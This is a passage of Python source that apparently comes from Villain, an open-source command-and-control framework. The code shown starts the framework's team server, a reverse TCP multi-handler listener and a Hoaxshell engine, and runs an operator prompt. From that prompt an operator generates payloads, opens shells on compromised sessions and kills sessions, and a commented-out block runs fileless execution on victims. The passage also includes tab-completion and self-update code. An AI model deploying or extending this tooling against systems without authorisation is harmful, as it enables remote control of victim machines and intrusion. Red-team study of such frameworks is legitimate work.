False\n\n\n\n\tdef find_common_prefix(self, strings):\n\t\t\n\t\tif not strings:\n\t\t\treturn \"\"\n\n\t\tprefix = \"\"\n\t\tshortest_string = min(strings, key=len)\n\n\t\tfor i, c in enumerate(shortest_string):\n\n\t\t\tif all(s[i] == c for s in strings):\n\t\t\t\tprefix += c\n\t\t\telse:\n\t\t\t\tbreak\n\t\t\n\t\treturn prefix\n\n\n\n\tdef path_autocompleter(self, root, search_term, hide_py_extensions = False):\n\t\t\t\n\t\t\t# Check if root or subdir\n\t\t\tpath_level = search_term.split(os.sep)\n\t\t\t\n\t\t\tif re.search(os.sep, search_term) and len(path_level) > 1:\n\t\t\t\tsearch_term\t= path_level[-1]\n\t\t\t\t\n\t\t\t\tfor i in range(0, len(path_level)-1):\n\t\t\t\t\troot += f'{os.sep}{path_level[i]}'\n\t\t\t\t\n\t\t\tdirs = next(os.walk(root))[1]\n\t\t\tmatch = [d + os.sep for d in dirs if re.match(f'^{re.escape(search_term)}', d)]\n\t\t\t\n\t\t\tif hide_py_extensions:\n\n\t\t\t\tif '__pycache__/' in match:\n\t\t\t\t\tmatch.remove('__pycache__/')\n\n\t\t\tfiles = next(os.walk(root))[2]\n\t\t\tmatch += [f for f in files if re.match(f'^{re.escape(search_term)}', f)]\n\t\t\t\n\t\t\t# Hide extensions\n\t\t\tif hide_py_extensions:\n\t\t\t\n\t\t\t\tfor i in range(0, len(match)):\n\t\t\t\t\tif match[i].count('.'):\n\t\t\t\t\t\tmatch[i] = match[i].rsplit('.', 1)[0]\n\t\t\t\t\t\n\n\t\t\t# Appending match substring \n\t\t\ttyped = len(search_term)\n\t\t\t\n\t\t\tif len(match) == 1:\t\t\t\t\n\t\t\t\tglobal_readline.insert_text(match[0][typed:])\t\t\t\t\n\t\t\t\tself.tab_counter = 0\n\t\t\telse:\t\t\t\t\n\t\t\t\tcommon_prefix = self.find_common_prefix(match)\n\t\t\t\tglobal_readline.insert_text(common_prefix[typed:])\n\t\t\t\t\n\t\t\t# Print all matches\n\t\t\tif len(match) > 1 and self.tab_counter > 1:\n\t\t\t\tprint('\\n')\t\n\t\t\t\tprint_columns(match)\n\t\t\t\tself.tab_counter = 0\n\t\t\t\tMain_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())\n\n\t\t\t\t\n\n\n\tdef update_prompt(self, typed, new_content, lower = False):\n\t\tglobal_readline.insert_text(new_content[typed:])\t\t\n\t\n\t\n\t\n\tdef complete(self, text, state):\n\t\t\n\t\ttext_cursor_position = global_readline.get_endidx()\n\t\tself.tab_counter += 1\n\t\tline_buffer_val_full = global_readline.get_line_buffer().strip()\n\t\tline_buffer_val = line_buffer_val_full[0:text_cursor_position]\n\t\t#line_buffer_remains = line_buffer_val_full[text_cursor_position:]\n\t\tline_buffer_list = re.sub(' +', ' ', line_buffer_val).split(' ')\n\t\tline_buffer_list_len = len(line_buffer_list) if line_buffer_list != [''] else 0\n\t\t\n\t\t# Return no input or input already matches a command\n\t\tif (line_buffer_list_len == 0):\n\t\t\treturn\n\t\t\t\n\t\tmain_cmd = line_buffer_list[0].lower()\n\t\t\n\t\t# Get prompt command from word fragment\n\t\t# print(f'{line_buffer_list_len} - {Main_prompt.ready}  - {main_cmd}')\n\t\tif line_buffer_list_len == 1:\n\t\t\tmatch = self.get_match_from_list(main_cmd, self.main_prompt_commands if Main_prompt.ready else self.pseudo_shell_commands)\n\t\t\tself.update_prompt(len(line_buffer_list[0]), match) if match else do_nothing()\n\n\t\n\t\t# Autocomplete session IDs\n\t\telif ((main_cmd in ['alias', 'kill', 'shell', 'repair', 'conptyshell'] and Main_prompt.ready) or (main_cmd in self.pseudo_shell_commands and not Main_prompt.ready)) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] not in [\"/\", \"~\"]):\n\t\t\t\n\t\t\tif line_buffer_list[-1] in (Sessions_Manager.active_sessions.keys()):\n\t\t\t\tpass\n\t\t\t\n\t\t\telse:\n\t\t\t\t\n\t\t\t\t# Autofill session id if only one active session\n\t\t\t\t# if Sessions_Manager.active_sessions:\n\n\t\t\t\t# \tid_already_set = any(re.search(id, line_buffer_val) for id in Sessions_Manager.active_sessions.keys())\n\n\t\t\t\t# \tif not id_already_set:\n\t\t\t\t# \t\tif (main_cmd in ['kill', 'shell']):\n\t\t\t\t# \t\t\tsession_id = list(Sessions_Manager.active_sessions.keys())[0]\n\t\t\t\t# \t\t\tself.update_prompt(len(line_buffer_list[-1]), session_id)\n\n\t\t\t\t# else:\n\t\t\t\tword_frag = line_buffer_list[-1]\n\t\t\t\tmatch = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.active_sessions.keys()) + Sessions_Manager.aliases)\n\t\t\t\tself.update_prompt(len(line_buffer_list[-1]), match) if match else do_nothing()\n\n\n\n\t\t# Autocomplete aliases for reset\n\t\telif (main_cmd in ['reset']) and (line_buffer_list_len > 1) and \\\n\t\t\t(line_buffer_list[-1][0] not in [\"/\", \"~\"]):\n\t\t\t\n\t\t\tif line_buffer_list[-1] in (Sessions_Manager.aliases):\n\t\t\t\tpass\n\t\t\t\n\t\t\telse:\n\t\t\t\tword_frag = line_buffer_list[-1]\n\t\t\t\tmatch = self.get_match_from_list(line_buffer_list[-1], list(Sessions_Manager.aliases))\n\t\t\t\tself.update_prompt(len(line_buffer_list[-1]), match) if match else do_nothing()\n\n\n\n\t\t# Autocomplete generate prompt command arguments\n\t\telif (main_cmd == 'generate') and (line_buffer_list_len > 1):\n\t\t\t\t\t\t\t\t\t\n\t\t\tword_frag = line_buffer_list[-1].lower()\n\t\t\tif re.search('payload=[\\\\w\\\\/\\\\\\\\]{0,}', word_frag):\n\t\t\t\t\n\t\t\t\ttmp = word_frag.split('=')\n\t\t\t\troot = self.payload_templates_root\t\n\n\t\t\t\tif tmp[1]:\t\t\t\t\t\n\t\t\t\t\tsearch_term = tmp[1]\n\t\t\t\t\tself.path_autocompleter(root, search_term, hide_py_extensions = True)\n\n\t\t\t\telif self.tab_counter > 1:\n\t\t\t\t\tcontents = os.listdir(root)\n\t\t\t\t\tdirectories = [f'{entry}/' for entry in contents if os.path.isdir(os.path.join(root, entry))]\n\t\t\t\t\tprint('\\n')\t\n\t\t\t\t\tprint_columns(directories)\n\t\t\t\t\tself.tab_counter = 0\n\t\t\t\t\tMain_prompt.rst_prompt() if Main_prompt.ready else sys.stdout.write('\\r' + Main_prompt.hoax_prompt + global_readline.get_line_buffer())\n\n\t\t\telse:\n\t\t\t\tmatch = self.get_match_from_list(line_buffer_list[-1], self.main_command_arguments)\n\t\t\t\tself.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else do_nothing()\n\n\n\t\t# Autocomplete help\n\t\telif (main_cmd == 'help') and (line_buffer_list_len > 1):\n\t\t\t\t\t\t\t\t\t\n\t\t\tword_frag = line_buffer_list[-1].lower()\n\t\t\tmatch = self.get_match_from_list(line_buffer_list[-1], self.main_prompt_commands)\n\t\t\tself.update_prompt(len(line_buffer_list[-1]), match, lower = True) if match else do_nothing()\n\n\t\t\n\t\t# Autocomplete paths\n\t\t\n\t\telif (main_cmd in ['inject', 'upload']) and (line_buffer_list_len > 1) and (line_buffer_list[-1][0] in [os.sep, \"~\"]):\n\t\t\t\n\t\t\troot = os.sep if (line_buffer_list[-1][0] == os.sep) else os.path.expanduser('~')\n\t\t\tsearch_term = line_buffer_list[-1] if (line_buffer_list[-1][0] != '~') else line_buffer_list[-1].replace('~', os.sep)\n\t\t\tself.path_autocompleter(root, search_term)\n\t\t\t\n\t\t# Reset tab counter after 0.5s of inactivity\n\t\tThread(name=\"reset_counter\", target=self.reset_counter).start()\n\t\treturn\n\n\n\t\ndef main():\n\n\tdo_nothing() if args.quiet else print_banner()\n\tcurrent_wd = os.path.dirname(os.path.abspath(__file__))\n\t\n\t# Check for updates\n\tif args.update:\n\t\t\n\t\ttry:\n\t\t\tlocal_files_path = current_wd + os.sep\n\t\t\tbranch = 'main' \n\t\t\turl = f'https://api.github.com/repos/t3l3machus/Villain/git/trees/{branch}?recursive=1'\n\t\t\traw_url = f'https://raw.githubusercontent.com/t3l3machus/Villain/{branch}/'\t\t\n\t\t\tLoading.active = True\n\t\t\tThread(target = Loading.animate, args = (f'[{INFO}] Checking for updates',), name = 'loading_animation', daemon = True).start()\n\n\t\t\t\n\t\t\tdef get_local_file_hash(filename):\n\t\t\t\t\n\t\t\t\ttry:\n\t\t\t\t\twith open(local_files_path + filename, 'rb') as f:\n\t\t\t\t\t\tdata = f.read()\n\t\t\t\t\t\treturn md5(data).hexdigest()\n\t\t\t\t\t\t\n\t\t\t\texcept FileNotFoundError:\n\t\t\t\t\treturn False\n\t\t\n\t\t\n\t\t\tdef update_file(filename, data):\n\t\t\n\t\t\t\ttry:\n\t\t\t\t\twith open(local_files_path + filename, 'wb') as f:\n\t\t\t\t\t\tf.write(data)\n\t\t\t\t\t\treturn True\n\t\t\t\t\t\t\n\t\t\t\texcept:\n\t\t\t\t\treturn False\n\t\t\n\t\t\n\t\t\ttry:\n\t\t\t\tresponse = requests_get(url = url, timeout=(5, 27))\n\t\t\t\tresponse.raise_for_status()  # raises stored HTTPError, if one occurred\n\t\t\t\tres_status_code = response.status_code\n\t\t\t\t\n\t\t\t#except requests.exceptions.HTTPError as e:\n\t\t\t\t#print(f'\\r[{ERR}] Failed to fetch latest version data: {e}') \n\n\t\t\texcept Exception as e:\n\t\t\t\tres_status_code = -1\n\t\t\t\tLoading.stop()\n\t\t\t\tprint(f'\\r[{ERR}] Failed to fetch latest version data: {e}') \n\t\t\n\t\t\n\t\t\tif res_status_code == 200:\n\t\t\t\t\n\t\t\t\tfiles = [file['path'] for file in response.json()['tree'] if file['type'] == 'blob']\n\t\t\t\tupdate_consent = False\n\t\t\t\t\n\t\t\t\tfor filename in files:\n\t\t\t\t\ttry:\n\t\t\t\t\t\tfile_data = requests_get(url = raw_url + filename, timeout=(5, 29))\n\t\t\t\t\texcept:\n\t\t\t\t\t\t# Temporary dirty solution\n\t\t\t\t\t\tprint(f'\\r[{ERR}] Failed to fetch file: {filename}. Installation may be corrupt. Consider reinstalling Villain.')\n\t\t\t\t\t\traise KeyboardInterrupt\n\t\t\t\t\t\t\n\t\t\t\t\tlatest_signature = md5(file_data.content).hexdigest()\n\t\t\t\t\tlocal_signature = get_local_file_hash(filename)\n\t\t\t\t\t\n\t\t\t\t\tif not local_signature or (local_signature != latest_signature):\n\t\t\t\t\t\tLoading.stop()\n\t\t\t\t\t\t\n\t\t\t\t\t\tif not update_consent:\t\t\t\t\n\t\t\t\t\t\t\tconsent = input(f'\\r[{INFO}] Updates detected. Would you like to proceed? [y/n]: ').lower().strip()\n\t\t\n\t\t\t\t\t\t\tif consent in ['y', 'yes']:\n\t\t\t\t\t\t\t\tupdate_consent = True\n\t\t\t\t\t\t\t\tLoading.active = True\n\t\t\t\t\t\t\t\tloading_animation = Thread(target = Loading.animate, args = (f'[{INFO}] Updating',), name = 'loading_animation', daemon = True).start()\n\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\n\t\t\t\t\t\tif update_consent:\n\t\t\t\t\t\t\tupdated = update_file(filename, file_data.content)\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif not updated:\n\t\t\t\t\t\t\t\tLoading.stop()\n\t\t\t\t\t\t\t\tprint(f'\\r[{ERR}] Error while updating files. Installation may be corrupt. Consider reinstalling Villain.')\n\t\t\t\t\t\t\t\texit(1)\n\t\t\t\t\t\t\t\t\n\t\t\t\tif update_consent:\n\t\t\t\t\tLoading.stop()\n\t\t\t\t\tprint(f'\\r[{INFO}] Update completed!')\n\t\t\t\t\tos.execv(sys.executable, ['python3'] + sys.argv + ['-q'] + ['-s'])\n\t\t\t\telse:\n\t\t\t\t\tLoading.stop(print_nl = True)\t\n\t\t\telse:\n\t\t\t\tLoading.stop(print_nl = True)\n\t\t\t\t\n\t\texcept KeyboardInterrupt:\n\t\t\tLoading.stop(print_nl = True)\n\t\t\tpass\n\t\t\t\n\t# Initialize essential services\n\tprint(f'[{INFO}] Initializing required services:')\n\n\t''' Init Core '''\n\tcore = Core_Server()\n\tcore_server = Thread(target = core.initiate, args = (), name = 'team_server')\n\tcore_server.daemon = True\n\tcore_server.start()\n\t\n\t# Wait for the Core server socket to be established\n\ttimeout_start = time()\n\n\twhile time() < (timeout_start + 5):\n\n\t\tif core.core_initialized:\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\tbreak\n\t\t\n\t\telif core.core_initialized == False:\t\t\t\n\t\t\tsys.exit(1)\n\t\t\t\n\telse:\n\t\tsys.exit(1)\n\n\n\t''' Init Reverse TCP multi-handler '''\n\treverseTCP_listener = TCP_Sock_Multi_Handler()\n\treverseTCP_listener_t = Thread(target = reverseTCP_listener.initiate_nc_listener, args = (), name = 'reverse_tcp_multi_handler')\n\treverseTCP_listener_t.daemon = True\n\treverseTCP_listener_t.start()\n\n\t# Wait for the Reverse TCP multi listener socket to be established\n\ttimeout_start = time()\n\n\twhile time() < (timeout_start + 5):\n\n\t\tif reverseTCP_listener.listener_initialized:\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\tbreak\n\t\t\n\t\telif reverseTCP_listener.listener_initialized == False:\t\t\t\n\t\t\tsys.exit(1)\n\t\t\t\n\telse:\n\t\tsys.exit(1)\n\t\n\t\n\t''' Init Hoaxshell Engine '''\n\tinitiate_hoax_server()\n\tpayload_engine = Payload_Generator()\n\tsessions_manager = Sessions_Manager()\n\tHoaxshell.server_unique_id = core.return_server_uniq_id()\n\n\n\t''' Init File Smuggler '''\n\tfile_smuggler = File_Smuggler()\n\n\n\t''' Define exit func '''\n\tdef do_nothing():\n\t\tpass\n\t\t\n\n\tdef villain_out(flee = False):\n\t\t\n\t\tbound = False\n\t\tverified = True\n\t\t\n\t\tif Sessions_Manager.active_sessions or core.sibling_servers:\n\t\t\tbound = True\n\n\t\tchk_msg = 'Do you wish to exit without terminating any of your active sessions? [y/n]: ' if flee else \\\n\t\t'Are you sure you wish to exit? All of your sessions/connections with siblings will be lost [y/n]: '\n\n\t\ttry:\n\t\t\tchoice = input(f'\\n{ATT} {chk_msg}').lower().strip() if bound else 'y'\n\t\t\tverified = True if choice in ['yes', 'y'] else False\n\n\t\texcept:\n\t\t\tprint()\n\t\t\tverified = False\n\n\t\tif verified:\n\n\t\t\ttry:\n\t\t\t\tCore_Server.announce_server_shutdown()\n\t\t\t\tHoaxshell.terminate() if not flee else do_nothing()\n\t\t\t\tcore.stop_listener()\n\n\t\t\texcept:\n\t\t\t\tpass\n\t\t\t\n\t\t\tfinally:\n\t\t\t\tprint() if bound else print('\\n')\n\t\t\t\tprint_meta()\n\t\t\t\tsys.exit(0)\n\n\t\treturn\n\n\n\n\t''' Start tab autoComplete '''\n\tcomp = Completer()\n\tglobal_readline.set_completer_delims(' \\t\\n;')\n\tglobal_readline.parse_and_bind(\"tab: complete\")\n\tglobal_readline.set_completer(comp.complete)\t\t\t\n\n\tprint(f'[{INFO}] Welcome! Type \"help\" to list available commands.')\t\t\n\t\n\t''' +---------[ Command prompt ]---------+ '''\n\twhile True:\n\t\t\n\t\ttry:\t\n\t\t\t\n\t\t\tif Main_prompt.ready:\n\t\t\t\t\t\t\t\t\n\t\t\t\tuser_input = input(Main_prompt.prompt).strip()\n\n\t\t\t\tif user_input == '':\n\t\t\t\t\tcontinue\n\t\t\t\t\n\t\t\t\t# Check if input is a chat message\n\t\t\t\tif user_input[0] == '#':\n\n\t\t\t\t\tif core.sibling_servers.keys():\n\t\t\t\t\t\tCore_Server.broadcast(user_input[1:], 'global_chat')\n\t\t\t\t\t\tprint(f'\\r[{INFO}] Message broadcasted.')\n\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint(f'\\r[{INFO}] You are currently not connected with other sibling servers.')\n\t\t\t\t\t\n\t\t\t\t\tcontinue\n\n\n\t\t\t\t# Handle single/double quoted arguments\n\t\t\t\tquoted_args_single = re.findall(\"'{1}[\\\\s\\\\S]*'{1}\", user_input)\n\t\t\t\tquoted_args_double = re.findall('\"{1}[\\\\s\\\\S]*\"{1}', user_input)\n\t\t\t\tquoted_args = quoted_args_single + quoted_args_double\n\t\t\t\t\n\t\t\t\tif len(quoted_args):\n\t\t\t\t\t\n\t\t\t\t\tfor arg in quoted_args:\n\t\t\t\t\t\tspace_escaped = arg.replace(' ', Main_prompt.SPACE)\n\t\t\t\t\t\t\n\t\t\t\t\t\tif (space_escaped[0] == \"'\" and space_escaped[-1] == \"'\") or (space_escaped[0] == '\"' and space_escaped[-1] == '\"'):\n\t\t\t\t\t\t\tspace_escaped = space_escaped[1:-1]\n\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\tuser_input = user_input.replace(arg, space_escaped)\n\t\t\t\t\t\t\n\t\t\t\t\n\t\t\t\t# Create cmd-line args list\n\t\t\t\tuser_input = user_input.split(' ')\n\t\t\t\tcmd_list = [w.replace(Main_prompt.SPACE, ' ') for w in user_input if w]\n\t\t\t\tcmd_list_len = len(cmd_list)\n\t\t\t\tcmd = cmd_list[0].lower() if cmd_list else ''\n\t\t\t\t\n\t\t\t\tif cmd in core.requests.keys():\n\t\t\t\t\tcore.requests[cmd] = True\n\t\t\t\t\tcontinue\n\n\t\t\t\t# Notification for deprecated / modified commands\n\t\t\t\telif cmd in ['exec']:\n\t\t\t\t\tprint(f'{ATT} Commands \"upload\" and \"exec\" can now only be used with an active pseudo shell. \"exec\" was also renamed to \"inject\".')\n\t\t\t\t\tcontinue\n\t\t\t\t\n\t\t\t\t# Validate number of args\n\t\t\t\tvalid = PrompHelp.validate(cmd, (cmd_list_len - 1))\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\tif not valid:\n\t\t\t\t\tcontinue\n\n\n\t\t\t\tif cmd == 'help':\t\t\t\t\t\n\t\t\t\t\tif cmd_list_len == 1:\n\t\t\t\t\t\tPrompHelp.print_main_help_msg()\n\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\telif cmd_list_len == 2:\n\t\t\t\t\t\tPrompHelp.print_detailed(cmd_list[1]) if cmd_list[1] in PrompHelp.commands.keys() \\\n\t\t\t\t\t\telse print(f'Command {cmd_list[1] if len(cmd_list[1]) <= 10 else f\"{cmd_list[1][0:4]}..{cmd_list[1][-4:]}\" } does not exist.')\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\n\n\t\t\t\telif cmd == 'id':\n\t\t\t\t\tprint(f'Server unique id: {ORANGE}{core.return_server_uniq_id()}{END}')\n\n\n\n\t\t\t\telif cmd == 'connect':\n\t\t\t\t\tcore.connect_with_sibling_server(cmd_list[1], cmd_list[2])\n\t\t\t\t\t\n\t\t\t\t\t\t\t\t\n\n\t\t\t\telif cmd == 'generate':\t\t\t\t\t\t\t\t\n\t\t\t\t\tpayload_engine.generate_payload(cmd_list[1:])\n\t\t\t\t\t\t\t\t\n\n\n\t\t\t\telif cmd == 'kill':\n\t\t\t\t\tsession_id = sessions_manager.alias_to_session_id(cmd_list[1])\n\t\t\t\t\t\n\t\t\t\t\tif not session_id:\n\t\t\t\t\t\tprint('Failed to interpret session_id.')\n\t\t\t\t\t\tcontinue\t\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tsessions_manager.kill_session(session_id)\n\n\t\t\t\t\t\t\n\n\n\n\t\t\t\t\t# if Sessions_Manager.active_sessions.keys():\n\t\t\t\t\t\t\n\t\t\t\t\t# \ttry:\n\n\t\t\t\t\t# \t\tMain_prompt.ready = False\n\t\t\t\t\t# \t\tMain_prompt.exec_active = True\n\t\t\t\t\t# \t\texecution_object = cmd_list[1]\n\t\t\t\t\t# \t\tsession_id = cmd_list[2]\n\t\t\t\t\t# \t\tis_file = False\n\n\t\t\t\t\t# \t\t# Check if session id has alias\n\t\t\t\t\t# \t\tsession_id = sessions_manager.alias_to_session_id(session_id)\n\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\tif not session_id:\n\t\t\t\t\t# \t\t\tprint(f'\\r[{ERR}] Failed to interpret session_id.')\n\t\t\t\t\t# \t\t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\t\tcontinue\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\tshell_type = Sessions_Manager.active_sessions[session_id]['Shell']\n\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\tif execution_object[0] in [os.sep, '~']:\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t\tfile_path = os.path.expanduser(execution_object)\n\t\t\t\t\t# \t\t\tis_file = True if os.path.isfile(file_path) else False\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t\ttry:\n\n\t\t\t\t\t# \t\t\t\tif is_file:\n\t\t\t\t\t# \t\t\t\t\texecution_object = get_file_contents(file_path, 'r')\n\t\t\t\t\t# \t\t\t\t\tif execution_object in [None, False, '']: \n\t\t\t\t\t# \t\t\t\t\t\traise\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t\t\telse:\n\t\t\t\t\t# \t\t\t\t\traise\n\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t\texcept:\n\t\t\t\t\t# \t\t\t\tprint(f'\\r[{ERR}] Failed to read file {file_path}.')\n\t\t\t\t\t# \t\t\t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\t\t\tcontinue\n\n\t\t\t\t\t# \t\tif not is_file and execution_object.lower() == 'exit':\n\t\t\t\t\t# \t\t\tprint(f'\\r[{INFO}] The proper way to terminate a session is by using the \"kill <SESSION ID>\" prompt command.')\n\t\t\t\t\t# \t\t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\t\tcontinue\n\n\t\t\t\t\t# \t\tif not is_file:\n\t\t\t\t\t# \t\t\t# Invoke Session Defender to inspect the command for dangerous input\n\t\t\t\t\t# \t\t\tdangerous_input_detected = False\n\n\t\t\t\t\t# \t\t\tif Session_Defender.is_active:\n\t\t\t\t\t# \t\t\t\tdangerous_input_detected = Session_Defender.inspect_command(Sessions_Manager.active_sessions[session_id]['OS Type'], execution_object)\n\n\t\t\t\t\t# \t\t\tif dangerous_input_detected:\n\t\t\t\t\t# \t\t\t\tSession_Defender.print_warning()\n\t\t\t\t\t# \t\t\t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\t\t\tcontinue\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t# If file, check if shell type is supported for exec\n\t\t\t\t\t# \t\tif shell_type not in ['unix', 'powershell.exe']:\n\t\t\t\t\t# \t\t\tprint(f'\\r[{INFO}] Script execution not supported for shell type: {shell_type}')\n\t\t\t\t\t# \t\t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\t\tcontinue\t\t\t\t\t\t\t\t\n\n\t\t\t\t\t# \t\t# Check if any sibling server has an active pseudo shell on that session\n\t\t\t\t\t# \t\tshell_occupied = core.is_shell_session_occupied(session_id)\n\n\t\t\t\t\t# \t\tif not shell_occupied:\n\t\t\t\t\t# \t\t\t# Check the session's stability and warn user\n\t\t\t\t\t# \t\t\tapproved = True\n\n\t\t\t\t\t# \t\t\tif Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Unstable':\n\t\t\t\t\t# \t\t\t\ttry:\n\t\t\t\t\t# \t\t\t\t\tchoice = input(f'\\r[{WARN}] This session is unstable. Running I/O-intensive commands may cause it to hang. Proceed? [y/n]: ')\n\t\t\t\t\t# \t\t\t\t\tapproved = True if choice.lower().strip() in ['yes', 'y'] else False\n\t\t\t\t\t# \t\t\t\texcept:\n\t\t\t\t\t# \t\t\t\t\tprint()\n\t\t\t\t\t# \t\t\t\t\tapproved = False\n\t\t\t\t\t\t\t\t\t\n\n\t\t\t\t\t# \t\t\tif approved:\n\t\t\t\t\t# \t\t\t\t# Check who is the owner of the shell session\n\t\t\t\t\t# \t\t\t\tsession_owner_id = sessions_manager.return_session_attr_value(session_id, 'Owner')\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t\t\tif session_owner_id == core.return_server_uniq_id():\n\t\t\t\t\t# \t\t\t\t\tFile_Smuggler.fileless_exec(execution_object, session_id, issuer = 'self') if is_file \\\n\t\t\t\t\t# \t\t\t\t\t\telse Hoaxshell.command_pool[session_id].append(execution_object)\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t\t\telse:\n\t\t\t\t\t# \t\t\t\t\tcore.send_receive_one_encrypted(session_owner_id, [execution_object, session_id], 'exec_file') if is_file \\\n\t\t\t\t\t# \t\t\t\t\t\telse Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, execution_object)\n\t\t\t\t\t# \t\t\telse:\n\t\t\t\t\t# \t\t\t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\t\t\tcontinue\t\t\t\t\t\t\t\t\t\t\n\n\t\t\t\t\t# \t\telse:\n\t\t\t\t\t# \t\t\tprint(f'\\r[{INFO}] This session is currently being used by a sibling server.')\n\t\t\t\t\t# \t\t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\t\tcontinue\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\n\t\t\t\t\t# \t\t# Reset prompt if session status is Undefined or Lost \n\t\t\t\t\t# \t\tif Sessions_Manager.active_sessions[session_id]['Status'] in ['Undefined', 'Lost']:\n\t\t\t\t\t# \t\t\tMain_prompt.ready = True\n\t\t\t\t\t\t\t\n\t\t\t\t\t# \texcept KeyboardInterrupt:\n\t\t\t\t\t# \t\tMain_prompt.ready = True\n\t\t\t\t\t# \t\tcontinue\n\n\t\t\t\t\t# else:\n\t\t\t\t\t# \tprint(f'\\r[{INFO}] No active session.')\t\t\n\n\t\t\t\t\t\t\n\n\t\t\t\telif cmd == 'shell':\n\t\t\t\t\t\t\n\t\t\t\t\tif Sessions_Manager.active_sessions.keys():\n\t\t\t\t\t\t\n\t\t\t\t\t\tMain_prompt.ready = False\t\n\t\t\t\t\t\tsession_id = Sessions_Manager.alias_to_session_id(cmd_list[1])\n\t\t\t\t\t\t\n\t\t\t\t\t\tif not session_id:\n\t\t\t\t\t\t\tprint('Failed to interpret session_id.')\n\t\t\t\t\t\t\tMain_prompt.ready = True\n\t\t\t\t\t\t\tcontinue\n\n\t\t\t\t\t\tshell_occupied = core.is_shell_session_occupied(session_id)\n\n\t\t\t\t\t\tif not shell_occupied:\t\t\t\t\t\n\t\t\t\t\t\t\tos_type = sessions_manager.active_sessions[session_id]['OS Type']\n\t\t\t\t\t\t\tHoaxshell.activate_pseudo_shell_session(session_id, os_type)\n\t\t\t\t\t\t\t\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tprint(f'\\r[{INFO}] This session is currently being used by a sibling server.')\n\t\t\t\t\t\t\tMain_prompt.ready = True\n\t\t\t\t\t\t\tcontinue\n\t\t\t\t\t\t\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint(f'\\r[{INFO}] No active session.')\t\t\n\n\n\t\t\t\n\t\t\t\telif cmd == 'alias':\n\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tsessions = Sessions_Manager.active_sessions.keys()\n\t\t\t\t\t\n\t\t\t\t\tif len(sessions):\n\t\t\t\t\t\t\n\t\t\t\t\t\tif cmd_list[2] in sessions:\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\talias = alias_sanitizer(cmd_list[1].strip())\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif isinstance(alias, list):\n\t\t\t\t\t\t\t\tprint(alias[0])\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\t# Check if alias is unique\n\t\t\t\t\t\t\t\tunique = True\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tfor session_id in sessions:\n\t\t\t\t\t\t\t\t\tif Sessions_Manager.active_sessions[session_id]['alias'] == alias.strip():\n\t\t\t\t\t\t\t\t\t\tunique = False\n\t\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t# Check if alias is a reserved keyword\n\t\t\t\t\t\t\t\tis_reserved = False\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif alias in ['Undefined', 'Active', 'Stable', 'Unstable']:\n\t\t\t\t\t\t\t\t\tis_reserved = True\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t# Check if alias is the id of another session\t\n\t\t\t\t\t\t\t\tis_session_id = False\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif alias in sessions:\n\t\t\t\t\t\t\t\t\tis_session_id = True\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tif unique and not is_session_id and not is_reserved:\n\t\t\t\t\t\t\t\t\tSessions_Manager.active_sessions[cmd_list[2]]['alias'] = alias.strip()\n\t\t\t\t\t\t\t\t\tSessions_Manager.active_sessions[cmd_list[2]]['aliased'] = True\n\t\t\t\t\t\t\t\t\tSessions_Manager.aliases.append(alias)\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\telse:\n\t\t\t\t\t\t\t\t\tprint('Illegal alias value.')\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tprint('Invalid session ID.')\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint(f'\\rNo active sessions.')\t\t\n\n\n\n\t\t\t\telif cmd == 'repair':\n\n\t\t\t\t\tsession_id = Sessions_Manager.alias_to_session_id(cmd_list[1])\n\t\t\t\t\t\n\t\t\t\t\tif not session_id:\n\t\t\t\t\t\tprint('Failed to interpret session_id.')\n\t\t\t\t\t\tMain_prompt.ready = 